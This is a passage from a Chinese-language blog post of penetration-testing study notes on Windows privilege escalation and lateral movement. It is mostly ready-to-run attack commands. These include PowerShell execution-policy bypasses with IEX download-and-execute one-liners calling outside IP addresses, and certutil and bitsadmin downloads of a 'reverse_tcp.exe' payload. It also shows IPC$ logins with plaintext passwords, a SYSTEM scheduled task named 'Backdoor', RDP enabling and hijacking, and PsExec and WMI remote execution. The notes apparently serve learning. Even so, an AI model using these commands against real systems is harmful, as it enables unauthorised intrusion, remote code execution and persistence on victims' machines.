class="built_in">set-location</span> &lt;绝对路径&gt; <span class="comment"># 设置路径</span></span><br><span class="line">powershell  <span class="comment"># cmd切换为powershell</span></span><br><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="operator">-file</span> .\<span class="number">1</span>.ps1  <span class="comment"># 绕过安全检测执行ps1文件</span></span><br><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="literal">-command</span> <span class="string">&quot;&amp;&#123;import-module &lt;被引入模块的绝对路径&gt;;&lt;引入模块的执行名称&gt;&#125;&quot;</span>     <span class="comment"># 在目标本地加载并执行</span></span><br><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-Nop</span> <span class="literal">-Noni</span>(<span class="built_in">New-Object</span> Net.webClient).DownloadString(<span class="string">&quot;&lt;远程脚本加载地址&gt;&quot;</span>); <span class="comment">#远程导入ps1脚本，绕过本地权限并执行，后面加执行参数就行了。</span></span><br></pre></td></tr></table></figure>

<h2 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">-exec</span> bypass(<span class="literal">-ExecutionPolicy</span> Bypass): 绕过安全执行策略。</span><br><span class="line"><span class="literal">-W</span> <span class="keyword">hidden</span> (<span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span>): 隐藏窗口</span><br><span class="line"><span class="literal">-Noni</span>(<span class="literal">-NonInteractive</span>): 非交互式。powershell不为用户提供交互式提示</span><br><span class="line"><span class="literal">-NoP</span>(<span class="literal">-NoProfile</span>): Powershell控制台不加载当前用户的配置文件</span><br><span class="line"><span class="literal">-noexit</span>：执行之后不退出shell，这个参数在使用键盘记录等脚本非常重要</span><br><span class="line"><span class="literal">-Nologo</span>：启动不显示版权标志的Powershell</span><br><span class="line"><span class="literal">-enc</span>: 解码base64,直接用在线的base64进行编码不可以，推荐使用下面的脚本，编码</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fileContent</span> = <span class="string">&quot;&lt;需要编码的内容&gt;&quot;</span></span><br><span class="line"><span class="variable">$bytes</span> = [<span class="type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="variable">$fileContent</span>)</span><br><span class="line"><span class="variable">$encodedCommand</span> = [<span class="type">Convert</span>]::ToBase64String(<span class="variable">$bytes</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$encodedCommand</span></span><br></pre></td></tr></table></figure>





















<p>powerup</p>
<p>正常导入ps1需要system 有system还提nml </p>
<p>所以使用下面的远程调用绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#x27;http://140.246.211.51:81/ps/PowerUp/PowerUp.ps1&#x27;);Invoke-AllChecks&quot;</span><br></pre></td></tr></table></figure>



<p><img src="image-20230313180145381.png" alt="image-20230313180145381"></p>
<p>调用成功   </p>
<p>发现dll劫持  可以直接 做一个dll过去换掉 重启服务应该就是能行了 </p>
<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="横移中的文件传输"><a href="#横移中的文件传输" class="headerlink" title="横移中的文件传输"></a>横移中的文件传输</h2><h3 id="通过网络共享"><a href="#通过网络共享" class="headerlink" title="通过网络共享"></a>通过网络共享</h3><p><code>net share</code>  ipc需要管理员权限呢</p>
<p><img src="image-20230315133646588.png" alt="image-20230315133646588"></p>
<p>实战往往中建立IPC$连接（不仅文件共享 还能进行其他远程管理）</p>
<p>建立IPC$的两个条件 1 主机开启IPC连接 2 主机开放 139和445</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">建立连接</span><br><span class="line">net use \\192.168.1.130\IPC$ &quot;c2316323798&quot; /user:&quot;windows10&quot;</span><br><span class="line">net use \\&lt;hostname&gt;\IPC$ &quot;&lt;password&gt;&quot; /user:&quot;&lt;username&gt;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="image-20230315134147404.png" alt="image-20230315134147404"></p>
<p>列出远程主机C盘共享目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.1.130\C$</span><br></pre></td></tr></table></figure>



<p><img src="image-20230315134345486.png" alt="image-20230315134345486"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\Users\paleonec\Desktop\C6F56D1B9609ABCE104C2934DC7BB327.jpg \\192.168.1.130\C$</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">访问其他 共享也一样 </span><br><span class="line">net use \\192.168.1.130\C$ &quot;c2316323798&quot; /user:&quot;windows10&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h2><h3 id="利用命令："><a href="#利用命令：" class="headerlink" title="利用命令："></a>利用命令：</h3><ul>
<li><code>net use \\&lt;目标IP&gt;\ipc$ &quot;&lt;密码&gt;&quot; /user:&lt;用户名&gt;</code>  进行IPC连接</li>
<li><code>net use</code> 查看连接信息</li>
<li><code>net use E: \\&lt;目标IP&gt;\C$</code> 把目标C盘映射到本地E盘</li>
<li><code>net use E: /del</code> 删除磁盘映射</li>
</ul>
<h3 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h3><p><code>IPC$</code>可以实现远程登陆及对默认共享资源的访问，而139端口的开启表示<code>NetBIOS</code>协议的应用。通过139、445端口，可以实现对共享文件/打印机的访问。因此，一般来说，<code>IPC$</code>需要139、445端口的支持。</p>
<h3 id="连接失败原因"><a href="#连接失败原因" class="headerlink" title="连接失败原因"></a>连接失败原因</h3><ul>
<li>用户名密码错误</li>
<li>目标没有打开ipc$共享</li>
<li>不能成功连接目标的139、445端口</li>
<li>命令输入错误</li>
</ul>
<h3 id="常见错误号"><a href="#常见错误号" class="headerlink" title="常见错误号"></a>常见错误号</h3><ul>
<li>错误号5：拒绝访问</li>
<li>错误号51：Windows无法找到网络路径，即网络中存在问题</li>
<li>错误号53：找不到网络路径，包括IP地址错误、目标未开机、目标的lanmanserver服务未启动、目标有防火墙</li>
<li>错误号67：找不到网络名，包括lanmanworkstation服务未启动，ipc$已被删除</li>
<li>错误号1219：提供的凭据和已存在的凭据集冲突</li>
<li>错误号1326：未知的用户名密码</li>
<li>错误号1792：试图登录，但网络登录服务没有启动，包括目标NetLogon服务未启动（连接域控制器时会出现此情况）</li>
<li>错误号2242：此用户名密码已过期。例如目标机器设置了账号管理策略，强制修改密码</li>
</ul>
<h2 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h2><p>使用以下命令的前提时建立了ipc$连接</p>
<ul>
<li><code>dir \\&lt;目标IP&gt;\c$</code>，列出远程主机C盘文件</li>
<li><code>tasklist /S &lt;目标IP&gt; /U &lt;用户名&gt; /P &lt;密码&gt;</code>  列出远程主机的进程</li>
<li><code>type \\&lt;目标IP&gt;\&lt;绝对路径&gt;</code>  读取远程主机文件</li>
</ul>
</blockquote>
<h3 id="搭建SMB服务器"><a href="#搭建SMB服务器" class="headerlink" title="搭建SMB服务器"></a>搭建SMB服务器</h3><p>smb 服务器消息块 又称网络文件共享系统 基于应用层 </p>
<p>一般使用NetBIOS协议或者TCP 分别使用139或445</p>
<p>实战中可以 在vps或受控内网机搭建smb 将文件放入共享目录 指定UNC路径 让目标远程加载SMB共享文件 需要使用SMB 匿名共享 且搭建的服务器能被访问</p>
<p>Linux 通过Impacket提供的smbserver.py搭建 </p>
<p>Windows如果有管理员权限 可以手动配置smb匿名共享 也可以通过 Invoke-BuildAnoymouSMBServer在本地快速启动匿名共享</p>
<h3 id="Windows自带工具"><a href="#Windows自带工具" class="headerlink" title="Windows自带工具"></a>Windows自带工具</h3><h4 id="Certuil"><a href="#Certuil" class="headerlink" title="Certuil"></a>Certuil</h4><p>提供了从网络中下载文件的功能</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://IP:PORT/shell.exe C:\reverse_tcp.exe</span><br><span class="line">certutil -urlcache -split -f  下载地址      保存文件名</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="image-20230315143512748.png" alt="image-20230315143512748"></p>
<p>本地   检测会被火绒/Defender拦  </p>
<p><img src="image-20230315143348043.png" alt="image-20230315143348043"></p>
<h4 id="BITSAdmin"><a href="#BITSAdmin" class="headerlink" title="BITSAdmin"></a>BITSAdmin</h4><p>win7以后自带</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer test http://IP:PORT/shell.exe C:\reverse_tcp.exe</span><br><span class="line">创建一个名为test的bitsadmin任务 </span><br></pre></td></tr></table></figure>

<p><img src="image-20230315143956762.png" alt="image-20230315143956762"></p>
<p>不好使 傻逼工具 不是system用不了  </p>
<h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><p>参考远程加载执行的思路</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object System.Net.WebClient).DownloadFile(&#x27;http://123.249.22.36/1.py&#x27;,&#x27;evil.py&#x27;)</span><br><span class="line">powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.28.128/imag/evil.txt&#x27;))&quot;</span><br></pre></td></tr></table></figure>



<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul>
<li>可上传免安装的可执行程序wget.exe到目标机器，使用wget下载文件。</li>
<li>ftp 等等 </li>
</ul>
<h2 id="创建计划任务"><a href="#创建计划任务" class="headerlink" title="创建计划任务"></a>创建计划任务</h2><h4 id="常规流程"><a href="#常规流程" class="headerlink" title="常规流程"></a>常规流程</h4><p>可以通过已有的IPC 在远程主机上创建计划任务 让目标主机定时或周期执行页数操作 在管理员权限下 通过计划任务横移</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1利用已建立的共享连接 传马</span><br><span class="line">2利用已建立的共享连接创建计划任务</span><br><span class="line">schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR C:\reverse_tcp.exe /RU System /F</span><br><span class="line">/S:指定连接系统 /TN：指定计划任务名称 /SC 指定计划任务执行频率 /MO 制定计划任务执行周期 /TR指定计划任务程序路径 /RU计划任务权限  /F如果已存在则强制创建</span><br><span class="line">如果没有建立IPC就要指定手动指定远程主机用户凭据</span><br><span class="line">schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR C:\reverse_tcp.exe /RU System /F /U Administrator /P Admin123</span><br><span class="line">3 执行以下命令</span><br><span class="line">schtasks /RUN /S 10.10.10.19 /I /TN Backdoor</span><br><span class="line">4.以下命令 将计划任务删除</span><br><span class="line">schtasks /Delete /S 10.10.10.19 /TN Backdoor /F</span><br></pre></td></tr></table></figure>



<p>也可以通过计划任务在主机上执行系统命令 将结果写入文件 然后通过type命令远程读取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR &quot;C:\Windows\System32\cmd.exe  /c &#x27;whoami &gt; C:\result.txt&#x27;&quot; /RU System /f</span><br><span class="line">type \\10.10.10.19\C$\result.txt</span><br></pre></td></tr></table></figure>



<h4 id="UNC路径加载执行"><a href="#UNC路径加载执行" class="headerlink" title="UNC路径加载执行"></a>UNC路径加载执行</h4><p>Windows使用UNC访问网络共享资源</p>
<p><code>\\servername\sharename\directory\filename</code></p>
<p>servername是服务器主机名 sharename是共享网络名称 firectory是共享下的目录filename是文件</p>
<p>远程主机上攻击载荷 可以直接使用UNC代替常规本地路径 让主机直接在测试人员搭建的SMB共享中加载载荷并执行 可以省去手动上传载荷的步骤</p>
<h2 id="远程桌面RDP利用"><a href="#远程桌面RDP利用" class="headerlink" title="远程桌面RDP利用"></a>远程桌面RDP利用</h2><p>默认 tcp3389</p>
<p>可能 会将已登录的用户强制退出 容易被发现</p>
<p>查询是否开启RDP</p>
<p><code>reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections</code></p>
<p><img src="image-20230318172335015.png" alt="image-20230318172335015"></p>
<p>若为 0x0是已经启动 若为1 则RDP已经被禁用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#开启远程桌面连接</span><br><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line">#关闭 仅允许使用网络级别身份验证的rdp连接 （鉴权）</span><br><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWOORD /d 0</span><br><span class="line">#设置防火墙放行3389 </span><br><span class="line">netsh advfirewall firewall add rule name =&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure>

<p>远程主机通过WMI开启 </p>
<p><code>wmic /Node:10.10.10.19 /User:Administrator /Password:123456 RDTOGGLE WHRER ServerName=&#39;WIN2016=WEB3&#39; call SetAllowTSConnections 1</code></p>
<h3 id="RDP-Hijacking"><a href="#RDP-Hijacking" class="headerlink" title="RDP Hijacking"></a>RDP Hijacking</h3><p> system权限 </p>
<p>query user</p>
<p>执行tscon</p>
<blockquote>
<p>SharpRDP 开源工具 开启远程桌面放行3389直接连接</p>
</blockquote>
<h2 id="PSEXEC"><a href="#PSEXEC" class="headerlink" title="PSEXEC"></a>PSEXEC</h2><p>原理 通过smb连接到服务器Admin$共享 并释放 “psexesvc.exe”二进制文件 注册名为 “PSEXESVC”服务 当客户端执行命令 服务端通过服务执行命令 回显数据</p>
<p>条件 </p>
<p>1.远程主机开启Admin$共享</p>
<p>2.防火墙未开启或开启445</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe -acceptula \\10.10.10.19 -u HACK-MY\Administrator -p Admin@123 -s cmd.exe</span><br><span class="line"></span><br><span class="line">-acceptula 禁止弹出许可证对话框 -u 指定用户名 -p指定密码 </span><br><span class="line">-s 以system启动进程 如果未指定 就是管理员权限</span><br></pre></td></tr></table></figure>

<p>内网渗透中 如果已有相应凭据 可以直接使用psexex连接远程主机</p>
<p>Imapacket 和MSF中内置了psexec模块 </p>
<h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h2><p>windows管理规范  </p>
<p>横移时 可以利用WMI提供的管理功能 通过以获取的用户凭据 与本地或远程主机进行交互 并控制其执行各种行为</p>
<p>两种利用方法</p>
<p>1 调用WMI的类方法进行远程执行 如 Win32_Proces中的Create方法可以在远程主机创建进程</p>
<p>Win32_Product类中Install方法可以在远程主机安装恶意MSI</p>
<p>2.远程部署WMI事件订阅 在特定条的事件发生时触发攻击</p>
<p>条件 1.WMI服务开启  2 .主机放行135端口</p>
<p>未完待续</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">One</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/02/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/">http://example.com/2023/02/21/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> Donate</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/01/21/Webshell%E5%B7%A5%E5%85%B7/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Webshell工具学习</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">One</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">20</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">9</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/paleonec" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">博客重构中。。。。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">转发和代理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">端口转发和代理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E5%92%8C%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.1.1.</span> <span class="toc-text">正向和反向连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E6%98%A0%E5%B0%84"><span class="toc-number">1.1.2.</span> <span class="toc-text">端口转发和映射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SOCKS%E4%BB%A3%E7%90%86"><span class="toc-number">1.1.3.</span> <span class="toc-text">SOCKS代理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E8%BD%AC%E5%8F%91%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7"><span class="toc-number">1.2.</span> <span class="toc-text">常见转发代理工具</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#lcx"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">lcx</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#frp"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">frp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nps"><span class="toc-number">1.2.0.3.</span> <span class="toc-text">nps</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ICMP%E9%9A%A7%E9%81%93"><span class="toc-number">1.2.1.</span> <span class="toc-text">ICMP隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#icmpsh%E4%BD%BF%E7%94%A8"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">icmpsh使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PingTunnel%E4%BD%BF%E7%94%A8"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">PingTunnel使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1ICMP%E9%9A%A7%E9%81%93"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">防御ICMP隧道</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IPV6%E9%9A%A7%E9%81%93"><span class="toc-number">1.2.2.</span> <span class="toc-text">IPV6隧道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#netcat"><span class="toc-number">1.2.3.</span> <span class="toc-text">netcat</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%93%E5%8F%96Banner%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">抓取Banner信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E7%AB%AF%E5%8F%A3%E7%9A%84%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">指定端口的扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E7%9B%91%E5%90%AC"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">端口监听</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="toc-number">1.2.3.4.</span> <span class="toc-text">文件传输</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E6%98%93%E8%81%8A%E5%A4%A9"><span class="toc-number">1.2.3.5.</span> <span class="toc-text">简易聊天</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96shell"><span class="toc-number">1.2.3.6.</span> <span class="toc-text">获取shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-HTTPS%E9%9A%A7%E9%81%93"><span class="toc-number">1.2.4.</span> <span class="toc-text">HTTP&#x2F;HTTPS隧道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E9%9A%A7%E9%81%93"><span class="toc-number">1.2.5.</span> <span class="toc-text">DNS隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.5.0.1.</span> <span class="toc-text">工作原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DNS%E8%A7%A3%E6%9E%90%E9%85%8D%E7%BD%AE"><span class="toc-number">1.2.5.0.2.</span> <span class="toc-text">DNS解析配置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#iodine"><span class="toc-number">1.2.5.0.3.</span> <span class="toc-text">iodine</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E6%9D%83%E9%99%90%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.1.</span> <span class="toc-text">Windows权限描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-number">2.2.</span> <span class="toc-text">内核提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#windows"><span class="toc-number">2.2.1.</span> <span class="toc-text">windows</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-number">2.3.</span> <span class="toc-text">系统服务提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="toc-number">2.3.1.</span> <span class="toc-text">不安全的服务权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%9D%83%E9%99%90%E8%84%86%E5%BC%B1"><span class="toc-number">2.3.2.</span> <span class="toc-text">服务注册表权限脆弱</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84%E6%9D%83%E9%99%90%E5%8F%AF%E6%8E%A7"><span class="toc-number">2.3.3.</span> <span class="toc-text">服务路径权限可控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E5%BC%95%E7%94%A8%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84"><span class="toc-number">2.3.4.</span> <span class="toc-text">未引用服务路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">2.3.5.</span> <span class="toc-text">自动安装配置文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">2.3.6.</span> <span class="toc-text">计划任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerUp"><span class="toc-number">2.3.7.</span> <span class="toc-text">PowerUp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSI%E5%AE%89%E8%A3%85%E7%AD%96%E7%95%A5%E6%8F%90%E6%9D%83"><span class="toc-number">2.4.</span> <span class="toc-text">MSI安装策略提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8"><span class="toc-number">2.4.1.</span> <span class="toc-text">确定是否存在</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E6%81%B6%E6%84%8FMSI%E5%B9%B6%E5%AE%89%E8%A3%85"><span class="toc-number">2.4.2.</span> <span class="toc-text">创建恶意MSI并安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8CMSI%E6%96%87%E4%BB%B6%E5%91%BD%E4%BB%A4"><span class="toc-number">2.4.3.</span> <span class="toc-text">执行MSI文件命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-number">2.4.4.</span> <span class="toc-text">工具使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">2.4.5.</span> <span class="toc-text">防御方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%E6%93%8D%E4%BD%9C"><span class="toc-number">2.5.</span> <span class="toc-text">访问令牌操作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><span class="toc-number">2.5.1.</span> <span class="toc-text">常规令牌窃取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83"><span class="toc-number">2.5.2.</span> <span class="toc-text">Potato家族提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-UAC"><span class="toc-number">2.6.</span> <span 